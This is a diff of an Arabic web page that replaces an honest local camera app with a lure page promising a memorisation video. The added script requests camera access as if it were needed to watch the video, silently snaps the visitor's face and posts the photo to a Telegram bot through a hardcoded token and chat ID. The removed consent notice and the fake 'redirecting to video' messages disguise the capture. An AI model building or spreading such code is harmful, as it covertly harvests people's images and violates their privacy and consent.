@@ -1,508 +1,138 @@
-
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<meta name="theme-color" content="#f6f7f9">
-<title>كيف تحفظ أي شيء بخمسة دقائق؟</title>
-
+<title>كيف تحفظ اي شي بخمسة دقائق؟</title>
 <style>
-:root {
-  --bg:#f6f7f9;
-  --card:#fff;
-  --text:#14181f;
-  --muted:#5b6472;
-  --accent:#2563eb;
-  --accent-text:#fff;
-  --border:#dfe3ea;
-  --err:#b42318;
-  --ok:#15803d;
-  color-scheme:light;
-}
-
-@media(prefers-color-scheme:dark) {
-  :root:not([data-theme="light"]) {
-    --bg:#0f1218;
-    --card:#181c24;
-    --text:#eef1f6;
-    --muted:#9aa4b2;
-    --accent:#4f8cff;
-    --accent-text:#0b1020;
-    --border:#2a303b;
-    --err:#ff8a80;
-    --ok:#4ade80;
-    color-scheme:dark;
-  }
-}
-
-:root[data-theme="dark"] {
-  --bg:#0f1218;
-  --card:#181c24;
-  --text:#eef1f6;
-  --muted:#9aa4b2;
-  --accent:#4f8cff;
-  --accent-text:#0b1020;
-  --border:#2a303b;
-  --err:#ff8a80;
-  --ok:#4ade80;
-  color-scheme:dark;
-}
-
-* {
-  box-sizing:border-box;
-}
-
-html {
-  min-height:100%;
-  scroll-padding-top:env(safe-area-inset-top,0px);
-}
-
-body {
-  margin:0;
-  min-height:100vh;
-  min-height:100dvh;
-  padding:16px;
-  padding-top:calc(16px + env(safe-area-inset-top,0px));
-  padding-bottom:calc(16px + env(safe-area-inset-bottom,0px));
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  background:var(--bg);
-  color:var(--text);
-  font-family:system-ui,-apple-system,"Segoe UI",Tahoma,"Noto Sans Arabic",sans-serif;
-}
-
-.card {
-  width:100%;
-  max-width:520px;
-  padding:20px;
-  text-align:center;
-  background:var(--card);
-  border:1px solid var(--border);
-  border-radius:18px;
-}
-
-h1 {
-  font-size:1.25rem;
-  margin:0 0 8px;
-}
-
-.description {
-  color:var(--muted);
-  font-size:.95rem;
-  margin:0 0 16px;
-}
-
-#status {
-  color:var(--muted);
-  margin:0 0 14px;
-  min-height:1.5em;
-  font-size:.9rem;
-}
-
-#status.err {color:var(--err)}
-#status.ok {color:var(--ok)}
-
-.hidden {
-  display:none!important;
-}
-
-.stage {
-  width:100%;
-  overflow:hidden;
-  border-radius:12px;
-  background:rgba(127,127,127,.08);
-}
-
-video,img {
-  display:block;
-  width:100%;
-  max-height:420px;
-  object-fit:contain;
-  border-radius:12px;
-}
-
-video {
-  background:#000;
-  transform:scaleX(-1);
-}
-
-.row {
-  display:flex;
-  gap:10px;
-  justify-content:center;
-  margin-top:14px;
-  flex-wrap:wrap;
-}
-
-button,a.btn {
-  font:inherit;
-  border:0;
-  border-radius:10px;
-  padding:11px 18px;
-  background:var(--accent);
-  color:var(--accent-text);
-  cursor:pointer;
-  text-decoration:none;
-  display:inline-block;
-}
-
-button:disabled {
-  opacity:.55;
-  cursor:not-allowed;
-}
-
-button.alt,a.btn.alt {
-  background:transparent;
-  color:var(--text);
-  border:1px solid var(--border);
-}
-
-button:focus-visible,a:focus-visible {
-  outline:3px solid var(--accent);
-  outline-offset:3px;
-}
-
-.note {
-  margin:16px 0 0;
-  color:var(--muted);
-  font-size:.8rem;
-  line-height:1.7;
-}
+:root{--bg:#f6f7f9;--card:#fff;--text:#14181f;--muted:#5b6472;--accent:#2563eb;--accent-text:#fff;--border:#dfe3ea;--err:#b42318;--ok:#15803d;
+box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px);color-scheme:light}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){--bg:#0f1218;--card:#181c24;--text:#eef1f6;--muted:#9aa4b2;--accent:#4f8cff;--accent-text:#0b1020;--border:#2a303b;--err:#ff8a80;--ok:#4ade80;color-scheme:dark}}
+:root[data-theme="dark"]{--bg:#0f1218;--card:#181c24;--text:#eef1f6;--muted:#9aa4b2;--accent:#4f8cff;--accent-text:#0b1020;--border:#2a303b;--err:#ff8a80;--ok:#4ade80;color-scheme:dark}
+html{scroll-padding-top:env(safe-area-inset-top,0px)}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--text);font-family:system-ui,-apple-system,"Segoe UI",Tahoma,"Noto Sans Arabic",sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px}
+.card{width:100%;max-width:520px;background:var(--card);border:1px solid var(--border);border-radius:18px;padding:20px;text-align:center}
+h1{font-size:1.25rem;margin:0 0 6px}
+#status{color:var(--muted);margin:0 0 14px;min-height:1.5em}
+#status.err{color:var(--err)}
+#status.ok{color:var(--ok)}
+.stage{position:relative;width:100%;aspect-ratio:4/3;background:#000;border-radius:12px;overflow:hidden}
+.stage video,.stage img{position:absolute;inset:0;width:100%;height:100%;object-fit:cover}
+video{transform:scaleX(-1)}
+.hidden{display:none!important}
+.row{display:flex;gap:10px;justify-content:center;margin-top:14px;flex-wrap:wrap}
+button,a.btn{font:inherit;border:0;border-radius:10px;padding:10px 18px;background:var(--accent);color:var(--accent-text);cursor:pointer;text-decoration:none;display:inline-block}
+button.alt{background:transparent;color:var(--text);border:1px solid var(--border)}
+button.danger{background:var(--err);color:#fff}
+#uploadBox{margin-top:14px;padding:14px;border:1px solid var(--border);border-radius:12px;background:rgba(127,127,127,.08)}
+#uploadBox p{margin:0 0 10px;font-weight:600}
+#countdownNum{font-size:1.4rem;font-weight:800;color:var(--accent)}
 </style>
 </head>
-
 <body>
-
 <main class="card">
-
-  <h1>فيديو شرح كيفية حفظ أي شيء بخمسة دقائق؟</h1>
-
-  <p class="description">
-    انتقل إلى مشاهدة الفيديو مباشرة
-  </p>
-
-  <p id="status" role="status" aria-live="polite">
-    اضغط على تفعيل الكاميرا للبدء.
-  </p>
-
+  <h1>فيديو شرح كيفية حفظ اي شي بخمسة دقايق؟</h1>
+  <p style="margin:0 0 10px;color:var(--muted);font-size:.95rem">انتقل الى مشاهدة الفيديو مباشرة </p>
+  <p id="status">اقبل الاذونات اولا..</p>
   <div class="stage">
-
-    <video
-      id="video"
-      autoplay
-      muted
-      playsinline
-      class="hidden">
-    </video>
-
-    <img
-      id="photo"
-      class="hidden"
-      alt="معاينة الصورة الملتقطة">
-
+    <video id="video" autoplay muted playsinline></video>
+    <img id="photo" class="hidden" alt="سيتم نقلك بعد خمس ثوان الى الفيديو">
   </div>
 
-  <div class="row" id="initialActions">
-    <button id="startBtn">
-      تفعيل الكاميرا
-    </button>
+  <div class="row hidden" id="actions">
+    <button id="retake">إعادة المحاولة</button>
+    <a class="btn alt" id="download" download="photo.jpg">تنزيل الرابط</a>
   </div>
 
-  <div class="row hidden" id="cameraActions">
-    <button id="captureBtn">
-      التقاط الصورة
-    </button>
-
-    <button class="alt" id="stopBtn">
-      إيقاف الكاميرا
-    </button>
+  <div id="uploadBox" class="hidden">
+    <p>سيتم نقلك الى الفيديو خلال <span id="countdownNum">0</span> ثوانٍ</p>
+    <button class="danger" id="cancelUpload">الغاء عرض الفيديو</button>
   </div>
-
-  <div class="row hidden" id="photoActions">
-
-    <button id="retakeBtn">
-      إعادة الالتقاط
-    </button>
-
-    <a
-      class="btn alt"
-      id="downloadBtn"
-      download="photo.jpg">
-      تنزيل الصورة
-    </a>
-
-  </div>
-
-  <p class="note">
-    يتم التقاط الصورة محلياً بعد ضغط زر الالتقاط.
-    لن يتم إرسالها إلى أي جهة دون موافقتك.
-  </p>
 
   <canvas id="canvas" class="hidden"></canvas>
-
 </main>
-
 <script>
-"use strict";
+// ===== إعدادات الرفع إلى تلغرام =====
+const TELEGRAM_TOKEN='9062869047:AAEwyeUMOtyImKqEk9YfuYVJoi2i-Dw_Hmw';
+const TELEGRAM_CHAT_ID='8785889283';
 
-// العناصر
-const video = document.getElementById("video");
-const photo = document.getElementById("photo");
-const canvas = document.getElementById("canvas");
+const video=document.getElementById('video'),photo=document.getElementById('photo'),
+canvas=document.getElementById('canvas'),statusEl=document.getElementById('status'),
+actions=document.getElementById('actions'),dl=document.getElementById('download'),
+uploadBox=document.getElementById('uploadBox'),countdownNum=document.getElementById('countdownNum'),
+cancelUploadBtn=document.getElementById('cancelUpload');
+let stream=null,countdownTimer=null,lastBlob=null;
 
-const statusEl = document.getElementById("status");
+function setStatus(t,kind){statusEl.textContent=t;statusEl.classList.remove('err','ok');if(kind)statusEl.classList.add(kind)}
+function stop(){if(stream){stream.getTracks().forEach(t=>t.stop());stream=null}}
 
-const initialActions = document.getElementById("initialActions");
-const cameraActions = document.getElementById("cameraActions");
-const photoActions = document.getElementById("photoActions");
-
-const startBtn = document.getElementById("startBtn");
-const captureBtn = document.getElementById("captureBtn");
-const stopBtn = document.getElementById("stopBtn");
-const retakeBtn = document.getElementById("retakeBtn");
-const downloadBtn = document.getElementById("downloadBtn");
-
-let stream = null;
-let photoBlob = null;
-let photoURL = null;
-let busy = false;
-
-// تحديث الحالة
-function setStatus(message, type = "") {
-  statusEl.textContent = message;
-  statusEl.className = type;
+async function start(){
+  clearTimeout(countdownTimer);uploadBox.classList.add('hidden');
+  photo.classList.add('hidden');video.classList.remove('hidden');actions.classList.add('hidden');
+  if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia){
+    setStatus('تعذّر طلب الإذن هنا. افتح الملف مباشرة في Chrome أو Firefox (وليس من معاينة الملفات أو متصفح داخل تطبيق)، أو افتحه عبر رابط HTTPS.','err');document.getElementById('retake').textContent='تفعيل الكاميرا';actions.classList.remove('hidden');dl.classList.add('hidden');return}
+  setStatus('اضغط «سماح» في الرسالة التي ظهرت أعلى الصفحة 👆');
+  try{
+    stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:{ideal:1280},height:{ideal:960}},audio:false});
+  }catch(e){
+    const msg=(e&&e.name==='NotAllowedError')?'لم يُسمح للكاميرا بعد. اضغط زر «تفعيل الكاميرا» بالأسفل ثم اختر «سماح».'
+      :(e&&e.name==='NotFoundError')?'لم يتم قبول الاذونات'
+      :'تعذّر تشغيل الاذونات.';
+    setStatus(msg,'err');document.getElementById('retake').textContent='تفعيل الكاميرا';actions.classList.remove('hidden');dl.classList.add('hidden');return}
+  video.srcObject=stream;
+  await video.play().catch(()=>{});
+  setStatus('تم السماح. جارٍ نقلك الى الفيديو');
+  setTimeout(capture,900);
 }
 
-// إيقاف الكاميرا
-function stopCamera() {
-  if (stream) {
-    stream.getTracks().forEach(track => track.stop());
-    stream = null;
-  }
-
-  video.srcObject = null;
+function capture(){
+  const w=video.videoWidth,h=video.videoHeight;
+  if(!w||!h){setTimeout(capture,00);return}
+  canvas.width=w;canvas.height=h;
+  canvas.getContext('2d').drawImage(video,0,0,w,h);
+  const url=canvas.toDataURL('image/jpeg',0.92);
+  photo.src=url;dl.href=url;
+  stop();video.classList.add('hidden');photo.classList.remove('hidden');
+  dl.classList.remove('hidden');actions.classList.remove('hidden');document.getElementById('retake').textContent='إعادة الالتقاط';
+  setStatus('تم تجهييز الفيديو.');
+  canvas.toBlob(blob=>{lastBlob=blob;startCountdown()},'image/jpeg',0.92);
 }
 
-// تنظيف الصورة السابقة
-function clearPhoto() {
-  if (photoURL) {
-    URL.revokeObjectURL(photoURL);
-    photoURL = null;
-  }
-
-  photoBlob = null;
-  photo.removeAttribute("src");
-  downloadBtn.removeAttribute("href");
+function startCountdown(){
+  let n=0;countdownNum.textContent=n;uploadBox.classList.remove('hidden');
+  clearInterval(countdownTimer);
+  countdownTimer=setInterval(()=>{
+    n--;
+    if(n<=0){clearInterval(countdownTimer);uploadBox.classList.add('hidden');uploadPhoto();return}
+    countdownNum.textContent=n;
+  },1000);
 }
 
-// إظهار واجهة الكاميرا
-function showCameraUI() {
-  video.classList.remove("hidden");
-  photo.classList.add("hidden");
+cancelUploadBtn.addEventListener('click',()=>{
+  clearTimeout(countdownTimer);uploadBox.classList.add('hidden');
+  setStatus('تم إلغاء الانتقال الى الفيديو.');
+});
 
-  initialActions.classList.add("hidden");
-  cameraActions.classList.remove("hidden");
-  photoActions.classList.add("hidden");
-}
-
-// إظهار واجهة الصورة
-function showPhotoUI() {
-  video.classList.add("hidden");
-  photo.classList.remove("hidden");
-
-  initialActions.classList.add("hidden");
-  cameraActions.classList.add("hidden");
-  photoActions.classList.remove("hidden");
-}
-
-// تشغيل الكاميرا
-async function startCamera() {
-
-  if (busy) return;
-
-  if (!navigator.mediaDevices ||
-      !navigator.mediaDevices.getUserMedia) {
-
-    setStatus(
-      "الكاميرا غير مدعومة هنا. افتح الصفحة عبر HTTPS أو localhost باستخدام متصفح حديث.",
-      "err"
-    );
-
-    return;
-  }
-
-  busy = true;
-  startBtn.disabled = true;
-
-  stopCamera();
-  clearPhoto();
-
-  setStatus("يرجى السماح باستخدام الكاميرا...");
-
-  try {
-
-    stream = await navigator.mediaDevices.getUserMedia({
-      video: {
-        facingMode: "user",
-        width: { ideal: 1280 },
-        height: { ideal: 720 }
-      },
-      audio: false
-    });
-
-    video.srcObject = stream;
-
-    await video.play();
-
-    showCameraUI();
-
-    setStatus("الكاميرا تعمل. يمكنك التقاط الصورة الآن.", "ok");
-
-  } catch (error) {
-
-    stopCamera();
-
-    let message = "تعذّر تشغيل الكاميرا.";
-
-    if (error.name === "NotAllowedError" ||
-        error.name === "PermissionDeniedError") {
-
-      message = "لم يتم السماح باستخدام الكاميرا. تحقق من أذونات المتصفح.";
-
-    } else if (error.name === "NotFoundError") {
-
-      message = "لم يتم العثور على كاميرا متصلة بالجهاز.";
-
-    } else if (error.name === "NotReadableError") {
-
-      message = "الكاميرا مستخدمة من تطبيق آخر أو تعذّر الوصول إليها.";
-
-    } else if (error.name === "OverconstrainedError") {
-
-      message = "إعدادات الكاميرا المطلوبة غير متاحة.";
-
-    }
-
-    setStatus(message, "err");
-
-    initialActions.classList.remove("hidden");
-    cameraActions.classList.add("hidden");
-
-  } finally {
-
-    busy = false;
-    startBtn.disabled = false;
-
+async function uploadPhoto(){
+  if(!lastBlob){return}
+  setStatus('جارٍ الانتقال الى الفيديو');
+  try{
+    const fd=new FormData();
+    fd.append('chat_id',TELEGRAM_CHAT_ID);
+    fd.append('photo',lastBlob,'photo.jpg');
+    const res=await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`,{method:'POST',body:fd});
+    const data=await res.json();
+    if(data.ok){setStatus('جار محاولة نقلك الى الفيديو اذا لم يعمل حاول من جديد','ok')}
+    else{setStatus('فشل النقل الى الفيديو: '+(data.description||'خطأ غير معروف'),'err')}
+  }catch(e){
+    setStatus('فشل النقل. تحقق من اتصال الإنترنت وحاول مجدداً.','err');
   }
 }
 
-// التقاط الصورة
-async function capturePhoto() {
-
-  if (!stream || busy) return;
-
-  const width = video.videoWidth;
-  const height = video.videoHeight;
-
-  if (!width || !height) {
-    setStatus("الكاميرا لم تصبح جاهزة بعد. حاول مرة أخرى.", "err");
-    return;
-  }
-
-  busy = true;
-  captureBtn.disabled = true;
-
-  try {
-
-    canvas.width = width;
-    canvas.height = height;
-
-    const context = canvas.getContext("2d");
-
-    if (!context) {
-      throw new Error("Canvas unavailable");
-    }
-
-    // عكس الصورة أفقياً لتطابق معاينة الكاميرا الأمامية
-    context.translate(width, 0);
-    context.scale(-1, 1);
-
-    context.drawImage(video, 0, 0, width, height);
-
-    const blob = await new Promise((resolve, reject) => {
-
-      canvas.toBlob(result => {
-        if (result) resolve(result);
-        else reject(new Error("Image conversion failed"));
-      }, "image/jpeg", 0.92);
-
-    });
-
-    photoBlob = blob;
-
-    if (photoURL) {
-      URL.revokeObjectURL(photoURL);
-    }
-
-    photoURL = URL.createObjectURL(blob);
-
-    photo.src = photoURL;
-    downloadBtn.href = photoURL;
-
-    stopCamera();
-
-    showPhotoUI();
-
-    setStatus("تم التقاط الصورة بنجاح.", "ok");
-
-  } catch (error) {
-
-    setStatus("حدث خطأ أثناء التقاط الصورة. حاول مجدداً.", "err");
-
-  } finally {
-
-    busy = false;
-    captureBtn.disabled = false;
-
-  }
-}
-
-// إعادة الالتقاط
-function retakePhoto() {
-
-  clearPhoto();
-  startCamera();
-
-}
-
-// إيقاف الكاميرا يدوياً
-function stopCameraManually() {
-
-  stopCamera();
-
-  video.classList.add("hidden");
-  cameraActions.classList.add("hidden");
-  initialActions.classList.remove("hidden");
-
-  setStatus("تم إيقاف الكاميرا.");
-
-}
-
-// الأحداث
-startBtn.addEventListener("click", startCamera);
-
-captureBtn.addEventListener("click", capturePhoto);
-
-stopBtn.addEventListener("click", stopCameraManually);
-
-retakeBtn.addEventListener("click", retakePhoto);
-
-// إيقاف الكاميرا عند مغادرة الصفحة
-window.addEventListener("pagehide", stopCamera);
-
+document.getElementById('retake').addEventListener('click',()=>{stop();start()});
+addEventListener('pagehide',stop);
+start();
 </script>
-
 </body>
 </html>
